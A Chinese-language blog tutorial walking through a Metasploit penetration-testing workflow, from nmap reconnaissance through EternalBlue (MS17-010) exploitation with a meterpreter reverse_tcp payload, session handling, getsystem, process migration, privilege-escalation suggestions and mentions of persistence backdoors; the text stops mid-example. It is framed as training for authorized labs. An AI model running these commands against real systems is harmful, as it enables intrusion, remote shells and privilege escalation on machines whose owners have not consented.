
            <div class="postcontent">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span>以下是将整个步骤说明 漏洞利用流程的全方位详细整理版；<span>整体按“授权准备 → 信息收集 → 漏洞确认 → 模块与 Payload 选择 → 参数配置 → 执行利用 → 会话管理 → 后渗透提权 → 横向移动注意事项 → 清理与报告 → 示例 → 检查清单”展开。仅限自有靶机、本地授权靶场或书面授权范围使用；不要对生产系统随意执行 exploit，可能导致服务中断。</span></span></p>
<h2><span>0. 核心流程总览</span></h2>
<p class="ds-markdown-paragraph"><span>MSF 漏洞利用通常不是“只跑一个 exploit”，而是标准化流程：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">text</span></div>
</div>
</div>
</div>
<pre>授权与环境准备
→ 信息收集
→ 漏洞确认
→ 搜索与选择模块
→ 选择 Payload
→ 配置参数
→ 执行利用
→ 会话管理
→ 后渗透与提权
→ 横向移动/影响评估（受控）
→ 痕迹清理与报告</pre>
</div>
<p class="ds-markdown-paragraph"><span>核心命令主线可概括为：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">text</span></div>
</div>
</div>
</div>
<pre>search → use → show options → set/setg → show payloads → set payload → check → run/exploit
→ sessions -l → sessions -i → 后渗透</pre>
</div>
<hr>
<h1><span>1. 环境与授权准备</span></h1>
<h2><span>1.1 必须确认的前提</span></h2>
<p class="ds-markdown-paragraph"><span>渗透测试前必须确认：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>已获得书面授权<span>或明确测试范围；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>使用本地靶机，如 Metasploitable、DVWA、VulnHub 靶机；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>Kali 攻击机与靶机网络互通；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>记录测试时间、目标 IP、端口、模块、Payload 和操作命令，便于复盘与报告；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>明确禁止测试的资产、时间段、风险窗口和应急联系人。</span></p>
</li>
</ul>
<h2><span>1.2 启动 MSF 与数据库</span></h2>
<p class="ds-markdown-paragraph"><span>启动 Metasploit 控制台：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>msfconsole</pre>
</div>
<p class="ds-markdown-paragraph"><span>如需使用 <code>db_nmap</code><span>、<code>hosts</code><span>、<code>services</code><span> 等数据库功能，建议确保 PostgreSQL 与 MSF 数据库正常：</span></span></span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">service postgresql start
msfdb init
msfconsole</span></pre>
</div>
<p class="ds-markdown-paragraph"><span>可创建 workspace 隔离项目记录：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>workspace <span class="token parameter variable">-a 项目名称
workspace</span></pre>
</div>
<h2><span>1.3 记录要求</span></h2>
<p class="ds-markdown-paragraph"><span>建议记录：</span></p>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>项目</span></th><th><span>示例</span></th></tr>
</thead>
<tbody>
<tr>
<td><span>测试时间</span></td>
<td><span>2026-xx-xx</span></td>
</tr>
<tr>
<td><span>目标 IP</span></td>
<td><span>192.168.1.100</span></td>
</tr>
<tr>
<td><span>开放端口</span></td>
<td><span>445、80、22</span></td>
</tr>
<tr>
<td><span>使用模块</span></td>
<td><span>exploit/windows/smb/ms17_010_eternalblue</span></td>
</tr>
<tr>
<td><span>Payload</span></td>
<td><span>windows/x64/meterpreter/reverse_tcp</span></td>
</tr>
<tr>
<td><span>LHOST/LPORT</span></td>
<td><span>192.168.1.10 / 4444</span></td>
</tr>
<tr>
<td><span>执行命令</span></td>
<td><span>完整命令与输出</span></td>
</tr>
<tr>
<td><span>证据</span></td>
<td><span>截图、日志、抓包</span></td>
</tr>
</tbody>
</table>
</div>
<hr>
<h1><span>2. 信息收集</span></h1>
<h2><span>2.1 常规端口与服务扫描</span></h2>
<p class="ds-markdown-paragraph"><span>先用常规手段确认目标开放了哪些端口和服务：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>nmap <span class="token parameter variable">-sV <span class="token parameter variable">-O -p- <span class="token operator">&lt;目标IP<span class="token operator">&gt;</span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>常见关注点：</span></p>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>目标信息</span></th><th><span>作用</span></th><th><span>示例</span></th></tr>
</thead>
<tbody>
<tr>
<td><span>开放端口</span></td>
<td><span>判断攻击面</span></td>
<td><span>445、80、22、3389</span></td>
</tr>
<tr>
<td><span>服务版本</span></td>
<td><span>匹配已知漏洞</span></td>
<td><span>Samba、Apache、SMB</span></td>
</tr>
<tr>
<td><span>操作系统</span></td>
<td><span>选择对应模块</span></td>
<td><span>Windows / Linux</span></td>
</tr>
<tr>
<td><span>配置弱点</span></td>
<td><span>辅助判断可利用性</span></td>
<td><span>匿名 FTP、弱口令</span></td>
</tr>
</tbody>
</table>
</div>
<h2><span>2.2 在 MSF 中使用 db_nmap</span></h2>
<p class="ds-markdown-paragraph"><span>在 <code>msfconsole</code><span> 中可直接使用集成 Nmap，结果会保存到 MSF 数据库：</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>db_nmap <span class="token parameter variable">-sV <span class="token operator">&lt;目标IP<span class="token operator">&gt;</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>查看主机与服务记录：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>hosts
services</pre>
</div>
<h2><span>2.3 Web 资产识别</span></h2>
<p class="ds-markdown-paragraph"><span>如目标开放 Web 服务，可结合：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>whatweb <span class="token operator">&lt;目标URL<span class="token operator">&gt;
dirsearch <span class="token parameter variable">-u <span class="token operator">&lt;目标URL<span class="token operator">&gt;
nikto <span class="token parameter variable">-h <span class="token operator">&lt;目标URL<span class="token operator">&gt;</span></span></span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>关注：CMS、框架版本、目录泄露、默认页面、管理入口、弱口令入口等。</span></p>
<h2><span>2.4 信息收集输出</span></h2>
<p class="ds-markdown-paragraph"><span>信息收集后应形成初步攻击面清单：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>目标 IP、主机名、操作系统；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>开放端口与服务版本；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>Web 路径与组件版本；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>可能的漏洞编号或配置弱点；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>需要进一步确认的候选漏洞。</span></p>
</li>
</ul>
<hr>
<h1><span>3. 漏洞确认</span></h1>
<p class="ds-markdown-paragraph"><span>扫描发现“可能存在漏洞”不等于“可利用”。应先用 MSF auxiliary 模块或手工方式验证。</span></p>
<h2><span>3.1 示例：检测 MS17-010</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>msf6 <span class="token operator">&gt; use auxiliary/scanner/smb/smb_ms17_010
msf6 <span class="token operator">&gt; <span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
msf6 <span class="token operator">&gt; run</span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>如果返回阳性结果，再考虑进入漏洞利用阶段。</span></p>
<h2><span>3.2 示例：搜索 CVE</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>search cve:2017-0144
search ms17-010
search samba usermap_script</pre>
</div>
<h2><span>3.3 使用 check 命令</span></h2>
<p class="ds-markdown-paragraph"><span>部分 exploit 模块支持 <code>check</code><span>，可在利用前探测目标是否存在漏洞：</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
check</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>注意：<code>check</code><span> 不是所有模块都支持；不支持时只能依据版本、补丁状态和辅助扫描结果判断。</span></span></p>
<hr>
<h1><span>4. 选择漏洞利用模块</span></h1>
<h2><span>4.1 搜索模块</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>search ms17-010
search samba usermap_script
search cve:2017-0144</pre>
</div>
<p class="ds-markdown-paragraph"><span>搜索结果重点看：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph">Name<span>：模块路径；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">Rank<span>：评级，优先 <code>excellent</code><span>、<code>great</code><span>；</span></span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph">Description<span>：适用目标；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">Disclosure Date<span>：披露时间。</span></p>
</li>
</ul>
<h2><span>4.2 常见模块类型</span></h2>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>类型</span></th><th><span>作用</span></th></tr>
</thead>
<tbody>
<tr>
<td><code>exploit</code></td>
<td><span>真正发起攻击的漏洞利用模块</span></td>
</tr>
<tr>
<td><code>auxiliary</code></td>
<td><span>扫描、探测、爆破等辅助模块</span></td>
</tr>
<tr>
<td><code>payload</code></td>
<td><span>攻击成功后执行的载荷，如 Meterpreter、Reverse Shell</span></td>
</tr>
<tr>
<td><code>post</code></td>
<td><span>后渗透模块，用于提权、信息收集、横向移动等</span></td>
</tr>
</tbody>
</table>
</div>
<h2><span>4.3 选用模块</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
</div>
<p class="ds-markdown-paragraph"><span>加载后提示符会变为类似：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">text</span></div>
</div>
</div>
</div>
<pre>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;</pre>
</div>
<hr>
<h1><span>5. 选择 Payload</span></h1>
<p class="ds-markdown-paragraph"><span>Payload 决定攻击成功后获得什么能力。常见类型：</span></p>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>Payload 类型</span></th><th><span>特点</span></th></tr>
</thead>
<tbody>
<tr>
<td><code>reverse_tcp</code></td>
<td><span>靶机主动回连攻击机，较容易绕过入站防火墙</span></td>
</tr>
<tr>
<td><code>bind_tcp</code></td>
<td><span>靶机本地监听端口，攻击机主动连接</span></td>
</tr>
<tr>
<td><code>meterpreter</code></td>
<td><span>内存交互式会话，功能较强</span></td>
</tr>
<tr>
<td><code>cmd/unix/reverse</code></td>
<td><span>Linux 靶机常用反向 Shell</span></td>
</tr>
</tbody>
</table>
</div>
<h2><span>5.1 Windows 示例</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token builtin class-name">set payload windows/x64/meterpreter/reverse_tcp</span></pre>
</div>
<h2><span>5.2 Linux 示例</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token builtin class-name">set payload cmd/unix/reverse</span></pre>
</div>
<h2><span>5.3 查看可用 Payload</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>show payloads</pre>
</div>
<p class="ds-markdown-paragraph"><span>选择时应考虑：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>目标操作系统与架构；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>目标出站/入站防火墙策略；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>是否需要 Meterpreter 后渗透能力；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>稳定性与兼容性；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>授权范围内的功能需求。</span></p>
</li>
</ul>
<hr>
<h1><span>6. 配置关键参数</span></h1>
<p class="ds-markdown-paragraph"><span>进入模块后先查看选项：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>show options</pre>
</div>
<p class="ds-markdown-paragraph"><span>常见参数：</span></p>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>参数</span></th><th><span>含义</span></th><th><span>示例</span></th></tr>
</thead>
<tbody>
<tr>
<td><code>RHOSTS</code></td>
<td><span>目标 IP，可支持 CIDR/文件</span></td>
<td><span>192.168.1.100</span></td>
</tr>
<tr>
<td><code>RPORT</code></td>
<td><span>目标端口</span></td>
<td><span>445、139、80</span></td>
</tr>
<tr>
<td><code>LHOST</code></td>
<td><span>攻击机监听 IP</span></td>
<td><span>192.168.1.10</span></td>
</tr>
<tr>
<td><code>LPORT</code></td>
<td><span>攻击机监听端口</span></td>
<td><span>4444</span></td>
</tr>
<tr>
<td><code>PAYLOAD</code></td>
<td><span>攻击载荷</span></td>
<td><span>meterpreter/reverse_tcp</span></td>
</tr>
<tr>
<td><code>TARGET</code></td>
<td><span>目标系统类型</span></td>
<td><span>通常保持默认</span></td>
</tr>
</tbody>
</table>
</div>
<h2><span>6.1 配置示例</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
<span class="token builtin class-name">set LHOST <span class="token operator">&lt;攻击机IP<span class="token operator">&gt;
<span class="token builtin class-name">set LPORT <span class="token number">4444
<span class="token builtin class-name">set payload windows/x64/meterpreter/reverse_tcp</span></span></span></span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>如目标端口非默认：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token builtin class-name">set RPORT <span class="token operator">&lt;端口号<span class="token operator">&gt;</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>可查看目标类型：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>show targets</pre>
</div>
<p class="ds-markdown-paragraph"><span>可查看高级选项：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>show advanced</pre>
</div>
<p class="ds-markdown-paragraph"><span>如需全局设置攻击机 IP：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>setg LHOST <span class="token operator">&lt;攻击机IP<span class="token operator">&gt;
setg LPORT <span class="token number">4444</span></span></span></pre>
</div>
<h2><span>6.2 再次确认</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>show options</pre>
</div>
<p class="ds-markdown-paragraph"><span>确认 Required 为 <code>yes</code><span> 的参数均已填写。</span></span></p>
<hr>
<h1><span>7. 执行漏洞利用</span></h1>
<p class="ds-markdown-paragraph"><span>配置完成后执行：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>exploit</pre>
</div>
<p class="ds-markdown-paragraph"><span>或：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>run</pre>
</div>
<p class="ds-markdown-paragraph"><span>如需后台运行：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>exploit <span class="token parameter variable">-j</span></pre>
</div>
<p class="ds-markdown-paragraph"><span>如果攻击成功，MSF 通常会建立一个会话。例如：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>Windows 靶机利用 MS17-010 成功后，可能获得 <code>NT AUTHORITY\SYSTEM</code><span> 权限；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>Linux 靶机利用 Samba usermap_script 漏洞成功后，可能直接获得 <code>root</code><span> 权限。</span></span></p>
</li>
</ul>
<h2><span>7.1 查看会话</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>sessions <span class="token parameter variable">-l</span></pre>
</div>
<h2><span>7.2 进入会话</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>sessions <span class="token parameter variable">-i <span class="token operator">&lt;会话ID<span class="token operator">&gt;</span></span></span></pre>
</div>
<h2><span>7.3 会话后台化</span></h2>
<p class="ds-markdown-paragraph"><span>在 Meterpreter 中：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>background</pre>
</div>
<p class="ds-markdown-paragraph"><span>或：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">bg</span></pre>
</div>
<p class="ds-markdown-paragraph"><span>然后可继续管理其他会话。</span></p>
<hr>
<h1><span>8. 后渗透与提权</span></h1>
<p class="ds-markdown-paragraph"><span>获得初始会话后，可以进一步评估影响，但仍需控制在授权范围内。</span></p>
<h2><span>8.1 Meterpreter 常见操作</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>getuid
sysinfo
ipconfig
<span class="token function">ps
getsystem</span></pre>
</div>
<p class="ds-markdown-paragraph"><span>说明：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><code>getuid</code><span>：查看当前用户；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>sysinfo</code><span>：查看系统信息；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>ipconfig</code><span>：查看网络配置；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>ps</code><span>：列出进程；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>getsystem</code><span>：尝试提权到 SYSTEM。</span></p>
</li>
</ul>
<h2><span>8.2 获取系统 Shell</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>shell</pre>
</div>
<p class="ds-markdown-paragraph"><span>进入目标系统原生命令行后，可用：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">whoami
<span class="token function">id</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>验证权限；输入 <code>exit</code><span> 返回 Meterpreter。</span></span></p>
<h2><span>8.3 进程迁移</span></h2>
<p class="ds-markdown-paragraph"><span>为防止会话因目标程序关闭而中断，可将 Meterpreter 迁移到稳定进程：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">ps
migrate <span class="token operator">&lt;PID<span class="token operator">&gt;</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>例如迁移到 <code>explorer.exe</code><span> 等稳定进程。迁移前确认 PID 与权限。</span></span></p>
<h2><span>8.4 本地提权建议</span></h2>
<p class="ds-markdown-paragraph"><span>使用后渗透模块寻找本地提权建议：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>use post/multi/recon/local_exploit_suggester
<span class="token builtin class-name">set <span class="token environment constant">SESSION <span class="token operator">&lt;会话ID<span class="token operator">&gt;
run</span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>根据输出选择候选提权模块，但必须在授权范围内验证。</span></p>
<h2><span>8.5 权限维持</span></h2>
<p class="ds-markdown-paragraph"><span>根据测试授权范围，可考虑使用 <code>persistence</code><span> 脚本或创建后门账号维持访问权限。<br>注意：权限维持风险高，必须明确授权、记录操作，并在测试结束后清理。</span></span></p>
<hr>
<h1><span>9. 横向移动与内网操作注意事项</span></h1>
<p class="ds-markdown-paragraph"><span>内网环境中，还可能涉及：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>横向移动；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>凭证收集；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>服务探测；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>域内信息收集；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>告警验证。</span></p>

</li>

</ul>
<p class="ds-markdown-paragraph"><span>但这些操作风险较高，必须：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>在明确授权和变更窗口内执行；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>保留完整审计记录；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>避免造成业务中断；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>避免触碰范围外资产；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>同步抓包或记录日志，用于复盘、告警验证和防御加固。</span></p>

</li>

</ul>
<hr>
<h1><span>10. 痕迹清理与报告</span></h1>
<p class="ds-markdown-paragraph"><span>测试结束后应恢复环境、清理测试账号、删除测试文件，并整理报告。清理操作也应在授权范围内进行并记录。</span></p>
<h2><span>10.1 清理内容</span></h2>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>删除上传的工具与测试文件；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>清理测试账号；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>移除测试后门；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>按授权要求处理日志与临时配置；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>恢复被修改的服务配置；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>确认目标系统状态恢复正常。</span></p>

</li>

</ul>
<h2><span>10.2 报告通常包括</span></h2>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>测试范围与授权说明；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>目标资产清单；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>发现的漏洞及风险等级；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>复现步骤与截图证据；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>影响评估；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>修复建议：打补丁、关闭不必要端口、升级服务版本、加固防火墙策略、最小权限、日志监控；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>复测结果；</span></p>

</li>
<li>
<p class="ds-markdown-paragraph"><span>操作记录与审计证据。</span></p>

</li>

</ul>
<hr>
<h1><span>11. 示例一：MS17-010 利用流程</span></h1>
<h2><span>11.1 信息收集</span></h2>

<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">

<div class="d2a24f03"><span class="d813de27">bash</span></div>

</div>

</div>

</div>
<pre>nmap <span class="token parameter variable">-sV <span class="token parameter variable">-O -p- <span class="token operator">&lt;目标IP<span class="token operator">&gt;</span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>或在 MSF 中：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>db_nmap <span class="token parameter variable">-sV <span class="token operator">&lt;目标IP<span class="token operator">&gt;
services</span></span></span></pre>
</div>
<h2><span>11.2 漏洞确认</span></h2>
<div class="md-code-block md-code-block-light">

</div>
</div>
</div>
<pre>msf6 <span class="token operator">&gt; use auxiliary/scanner/smb/smb_ms17_010
msf6 <span class="token operator">&gt; <span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
msf6 <span class="token operator">&gt; run</span></span></span></span></span></span></pre>
</div>
<h2><span>11.3 利用</span></h2>

</div>

use exploit/windows/smb/ms17_010_eternalblue
